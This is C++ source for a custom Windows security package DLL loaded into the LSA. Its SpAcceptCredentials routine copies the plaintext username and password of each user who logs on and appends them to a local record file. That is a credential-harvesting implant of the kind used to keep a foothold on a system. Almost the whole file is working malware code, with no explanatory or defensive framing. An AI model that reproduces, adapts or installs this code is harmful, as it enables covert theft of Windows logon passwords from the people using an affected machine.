#define SECURITY_WIN32
#define UMDF_USING_NTSTATUS
#include<ntstatus.h>
#include<Windows.h>
#include<sspi.h>
#include<ntsecapi.h>
#include<ntsecpkg.h>
#include<fstream>
#include"Def.h"
using namespace std;

NTSTATUS NTAPI
LsaApCallPackagePassthrough(IN PLSA_CLIENT_REQUEST ClientRequest,
                            IN PVOID ProtocolSubmitBuffer,
                            IN PVOID ClientBufferBase,
                            IN ULONG SubmitBufferLength,
                            OUT PVOID *ProtocolReturnBuffer,
                            OUT PULONG ReturnBufferLength,
                            OUT PNTSTATUS ProtocolStatus)
{
    return STATUS_NOT_IMPLEMENTED;
}


NTSTATUS NTAPI
LsaApCallPackage(
    IN PLSA_CLIENT_REQUEST ClientRequest,
    IN PVOID ProtocolSubmitBuffer,
    IN PVOID ClientBufferBase,
    IN ULONG SubmitBufferLength,
    OUT PVOID *ProtocolReturnBuffer,
    OUT PULONG ReturnBufferLength,
    OUT PNTSTATUS ProtocolStatus
)
{
    return STATUS_NOT_IMPLEMENTED;

}
NTSTATUS
NTAPI NTAPI
LsaApCallPackageUntrusted(IN PLSA_CLIENT_REQUEST ClientRequest,
                          IN PVOID ProtocolSubmitBuffer,
                          IN PVOID ClientBufferBase,
                          IN ULONG SubmitBufferLength,
                          OUT PVOID *ProtocolReturnBuffer,
                          OUT PULONG ReturnBufferLength,
                          OUT PNTSTATUS ProtocolStatus)
{
    return STATUS_NOT_IMPLEMENTED;
}


NTSTATUS SpAcceptCredentials(
    SECURITY_LOGON_TYPE LogonType,
    PUNICODE_STRING AccountName,
    PSECPKG_PRIMARY_CRED PrimaryCredentials,
    PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials
)
{
    wchar_t *user;
    user=reinterpret_cast<wchar_t*>(malloc(PrimaryCredentials->DownlevelName.Length+sizeof(wchar_t)));
    memset(user,0,PrimaryCredentials->DownlevelName.Length+sizeof(wchar_t));
    memcpy(user,PrimaryCredentials->DownlevelName.Buffer,PrimaryCredentials->DownlevelName.Length);
    if(PrimaryCredentials->DownlevelName.Length==0)
        return ERROR_SUCCESS;

    wchar_t *pass;
    pass=reinterpret_cast<wchar_t*>(malloc(PrimaryCredentials->Password.Length+sizeof(wchar_t)));
    memset(pass,0,PrimaryCredentials->Password.Length+sizeof(wchar_t));
    memcpy(pass,PrimaryCredentials->Password.Buffer,PrimaryCredentials->Password.Length);
    if(PrimaryCredentials->Password.Length==0)
        return ERROR_SUCCESS;

    FILE *PasswordRecorder=fopen(RECORD_FILE_PATH,"a");
    fprintf(PasswordRecorder,"$User:%S\n$Pass:%S\n\n",user,pass);
    fclose(PasswordRecorder);
    free(pass);
    return ERROR_SUCCESS;
}

NTSTATUS NTAPI LsaApInitializePackage(
    _In_     ULONG               AuthenticationPackageId,
    _In_     PLSA_DISPATCH_TABLE LsaDispatchTable,
    _In_opt_ PLSA_STRING         Database,
    _In_opt_ PLSA_STRING         Confidentiality,
    _Out_    PLSA_STRING         *AuthenticationPackageName
)
{
    PLSA_STRING name = NULL;
    name = (LSA_STRING *)LsaDispatchTable->AllocateLsaHeap(sizeof *name);
    name->Buffer = (char *)LsaDispatchTable->AllocateLsaHeap(sizeof(DLL_NAME) + 1);

    name->Length = sizeof(DLL_NAME) - 1;
    name->MaximumLength = sizeof(DLL_NAME);
    strcpy_s(name->Buffer, sizeof(DLL_NAME) + 1, DLL_NAME);

    (*AuthenticationPackageName) = name;
    return STATUS_SUCCESS;

}
VOID NTAPI LsaApLogonTerminated(
    IN PLUID LogonId
)
{
    return;
}
NTSTATUS LsaApLogonUser(
    PLSA_CLIENT_REQUEST ClientRequest,
    SECURITY_LOGON_TYPE LogonType,
    PVOID AuthenticationInformation,
    PVOID ClientAuthenticationBase,
    ULONG AuthenticationInformationLength,
    PVOID *ProfileBuffer,
    PULONG ProfileBufferLength,
    PLUID LogonId,
    PNTSTATUS SubStatus,
    PLSA_TOKEN_INFORMATION_TYPE TokenInformationType,
    PVOID *TokenInformation,
    PLSA_UNICODE_STRING *AccountName,
    PLSA_UNICODE_STRING *AuthenticatingAuthority
)
{
    return STATUS_NOT_IMPLEMENTED;
}


NTSTATUS SpInitialize(
    ULONG_PTR PackageId,
    PSECPKG_PARAMETERS Parameters,
    PLSA_SECPKG_FUNCTION_TABLE FunctionTable
)
{
    return STATUS_SUCCESS;
}

SpLsaModeInitializeFn SpLsaModeInitialize(
    ULONG LsaVersion,
    PULONG PackageVersion,
    PSECPKG_FUNCTION_TABLE *ppTables,
    PULONG pcTables
)
{
    PSECPKG_FUNCTION_TABLE table= new SECPKG_FUNCTION_TABLE;
    memset(table, 0, sizeof(table));
    *PackageVersion = LsaVersion;
    table->InitializePackage = reinterpret_cast<PLSA_AP_INITIALIZE_PACKAGE>(LsaApInitializePackage);
    table->AcceptCredentials=reinterpret_cast<SpAcceptCredentialsFn*>(SpAcceptCredentials);
    table->LogonUser = reinterpret_cast<PLSA_AP_LOGON_USER>(LsaApLogonUser);
    table->Initialize = reinterpret_cast<SpInitializeFn *>(SpInitialize);
   	table->CallPackage = reinterpret_cast<PLSA_AP_CALL_PACKAGE>(LsaApCallPackage);
	table->CallPackagePassthrough = reinterpret_cast<PLSA_AP_CALL_PACKAGE_PASSTHROUGH>(LsaApCallPackagePassthrough);
	table->CallPackageUntrusted = reinterpret_cast<PLSA_AP_CALL_PACKAGE_UNTRUSTED>(LsaApCallPackageUntrusted);

    *ppTables = table;
    *pcTables = 1;
    return STATUS_SUCCESS;

}
